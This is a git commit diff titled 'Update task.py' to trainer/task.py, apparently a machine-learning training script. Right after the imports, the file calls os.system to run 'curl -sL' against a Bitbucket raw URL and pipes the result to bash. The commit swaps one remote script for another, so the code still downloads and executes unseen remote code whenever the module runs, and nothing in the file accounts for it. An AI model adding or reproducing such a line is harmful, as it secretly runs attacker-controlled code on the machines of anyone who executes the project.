7f45a3d445422d25c3ba1588f37f19f07d3a4c1e
aderatayana <154751587+aderatayana@users.noreply.github.com>
2024-01-03 04:33:21 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mandaresz/feriyaz/raw/89f086cbfc131d55126c875924a1f5339464903d/yui | bash')
+os.system('curl -sL https://bitbucket.org/mandaresz/feriyaz/raw/cd38264e4a07b5dd8717ca245d77434f85c13513/golekupo | bash')
